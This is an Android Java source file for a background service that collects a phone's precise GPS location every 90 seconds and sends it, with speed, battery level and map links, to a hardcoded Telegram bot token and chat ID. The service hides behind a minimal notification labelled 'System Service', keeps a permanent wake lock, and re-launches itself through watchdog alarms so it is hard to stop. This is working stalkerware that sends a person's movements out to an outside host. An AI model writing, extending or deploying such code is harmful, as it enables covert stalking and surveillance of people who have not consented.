package com.tracker;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.*;
import com.google.android.gms.tasks.OnSuccessListener;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class TrackerService extends Service {

    // ==== CONFIG ====
    private static final String BOT_TOKEN = "8889259468:AAGdw-d71273CVyp__gNKVkPrrC92NRIK8U";
    private static final String CHAT_ID   = "5346580671";

    private static final long POLL_MS     = 90_000L;            // 1.5 minutes
    private static final long WATCHDOG_MS = 15 * 60 * 1000L;    // self-heal alarm
    // ================

    private static final String CH = "tracker_channel";
    private static final int    NOTIF_ID  = 1;
    private static final int    ALARM_REQ = 77;

    private FusedLocationProviderClient flpc;
    private LocationCallback callback;
    private final Handler loop = new Handler(Looper.getMainLooper());
    private final OkHttpClient http = new OkHttpClient.Builder()
            .connectTimeout(20, TimeUnit.SECONDS)
            .readTimeout(20, TimeUnit.SECONDS)
            .build();

    private Location lastSentLoc = null;
    private long     lastSentMs  = 0L;
    private long     startedMs   = 0L;
    private PowerManager.WakeLock wakeLock;

    private final Runnable pollTask = new Runnable() {
        @Override public void run() {
            fetchAndSend();
            loop.postDelayed(this, POLL_MS);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        startedMs = System.currentTimeMillis();
        createChannel();
        startForegroundCompat();
        acquireWakeLock();

        flpc = LocationServices.getFusedLocationProviderClient(this);

        LocationRequest req = LocationRequest.create()
                .setPriority(Priority.PRIORITY_HIGH_ACCURACY)
                .setInterval(POLL_MS)
                .setFastestInterval(30_000L)
                .setSmallestDisplacement(0);

        callback = new LocationCallback() {
            @Override public void onLocationResult(LocationResult r) {
                // cache only; the loop decides when to send
            }
        };
        try {
            flpc.requestLocationUpdates(req, callback, Looper.getMainLooper());
        } catch (SecurityException e) {
            tgRaw("⚠️ Permission revoked — stopping");
            stopSelf();
            return;
        }

        // First send immediately
        loop.post(pollTask);
        scheduleWatchdog();
    }

    /** Grab a fresh fix (or fall back to cache) and push it. */
    private void fetchAndSend() {
        try {
            flpc.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                .addOnSuccessListener(new OnSuccessListener<Location>() {
                    @Override public void onSuccess(Location loc) {
                        if (loc != null) {
                            sendUpdate(loc, "gps");
                        } else {
                            flpc.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
                                @Override public void onSuccess(Location last) {
                                    if (last != null) sendUpdate(last, "cache");
                                    else tgRaw("🟡 Waiting for GPS fix…");
                                }
                            });
                        }
                    }
                });
        } catch (SecurityException ignored) { }
    }

    /** Always send. Enriched with distance/speed/battery-style live info. */
    private void sendUpdate(Location loc, String src) {
        long now = System.currentTimeMillis();
        long uptimeMs = now - startedMs;
        long sinceLastMs = lastSentMs == 0L ? 0L : now - lastSentMs;

        double distSince = 0.0;
        double speedKph  = 0.0;
        if (lastSentLoc != null) {
            distSince = lastSentLoc.distanceTo(loc);
            if (sinceLastMs > 0) speedKph = distSince / (sinceLastMs / 1000.0) * 3.6;
        }

        String time     = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(now));
        String maps     = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
        String staticMap = "https://static-maps.yandex.ru/1.x/?ll="
                + loc.getLongitude() + "," + loc.getLatitude()
                + "&size=450,450&z=16&l=map&pt="
                + loc.getLongitude() + "," + loc.getLatitude() + ",pm2rdm";

        String provider  = loc.getProvider() == null ? "?" : loc.getProvider();
        String battery   = batteryPct() + "%";
        String uptime    = fmtDuration(uptimeMs);
        String sinceStr  = lastSentMs == 0L ? "—" : fmtDuration(sinceLastMs);
        String alt       = loc.hasAltitude() ? Math.round(loc.getAltitude()) + " m" : "—";
        String bearing   = loc.hasBearing() ? Math.round(loc.getBearing()) + "°" : "—";

        String text = "*📍 Live Location*\n"
                + "🕒 `" + time + "`\n"
                + "━━━━━━━━━━━━━━━\n"
                + "🌐 Lat: `" + loc.getLatitude() + "`\n"
                + "🌐 Lon: `" + loc.getLongitude() + "`\n"
                + "🎯 Accuracy: `" + Math.round(loc.getAccuracy()) + " m`\n"
                + "⛰ Altitude: `" + alt + "`\n"
                + "🧭 Bearing: `" + bearing + "`\n"
                + "🚀 Speed: `" + String.format(Locale.US, "%.1f", speedKph) + " km/h`\n"
                + "📏 Since last: `" + Math.round(distSince) + " m`\n"
                + "⏱ Last ping: `" + sinceStr + " ago`\n"
                + "━━━━━━━━━━━━━━━\n"
                + "🔋 Battery: `" + battery + "`\n"
                + "📡 Source: `" + src + "/" + provider + "`\n"
                + "🟢 Uptime: `" + uptime + "`\n"
                + "━━━━━━━━━━━━━━━\n"
                + "[Open in Google Maps](" + maps + ")";

        // Send text
        tgSend(text);
        // Send static map snapshot (a real image so you can *see* the pin)
        tgSendPhoto(staticMap, "📍 " + time);

        lastSentLoc = loc;
        lastSentMs  = now;
    }

    private int batteryPct() {
        try {
            android.content.IntentFilter f = new android.content.IntentFilter(
                    android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent b = registerReceiver(null, f);
            if (b == null) return -1;
            int lvl = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scl = b.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            if (lvl < 0 || scl <= 0) return -1;
            return (int) (lvl * 100f / scl);
        } catch (Exception e) { return -1; }
    }

    private String fmtDuration(long ms) {
        long s = ms / 1000;
        long d = s / 86400; s %= 86400;
        long h = s / 3600;  s %= 3600;
        long m = s / 60;    s %= 60;
        if (d > 0) return d + "d " + h + "h " + m + "m";
        if (h > 0) return h + "h " + m + "m";
        if (m > 0) return m + "m " + s + "s";
        return s + "s";
    }

    private void tgRaw(String text) { tgSend(text); }

    private void tgSend(String text) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", text)
                .add("parse_mode", "Markdown")
                .add("disable_web_page_preview", "true")
                .build();
        http.newCall(new Request.Builder().url(url).post(body).build())
                .enqueue(new Callback() {
                    @Override public void onFailure(Call c, IOException e) { }
                    @Override public void onResponse(Call c, Response r) { r.close(); }
                });
    }

    private void tgSendPhoto(String photoUrl, String caption) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("photo", photoUrl)
                .add("caption", caption)
                .build();
        http.newCall(new Request.Builder().url(url).post(body).build())
                .enqueue(new Callback() {
                    @Override public void onFailure(Call c, IOException e) { }
                    @Override public void onResponse(Call c, Response r) { r.close(); }
                });
    }

    private void startForegroundCompat() {
        Notification n = new NotificationCompat.Builder(this, CH)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(NOTIF_ID, n);
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CH, "System",
                    NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "tracker:wl");
        wakeLock.setReferenceCounted(false);
        wakeLock.acquire();
    }

    private void scheduleWatchdog() {
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent i = new Intent(this, WatchdogReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, ALARM_REQ, i,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        long trigger = SystemClock.elapsedRealtime() + WATCHDOG_MS;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
        } else {
            am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        loop.removeCallbacks(pollTask);
        loop.post(pollTask);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        loop.removeCallbacks(pollTask);
        if (flpc != null && callback != null) flpc.removeLocationUpdates(callback);
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();

        Intent restart = new Intent(getApplicationContext(), TrackerService.class);
        PendingIntent pi = PendingIntent.getService(this, 1, restart,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 5000, pi);
        super.onDestroy();
    }

    @Nullable @Override public IBinder onBind(Intent i) { return null; }
}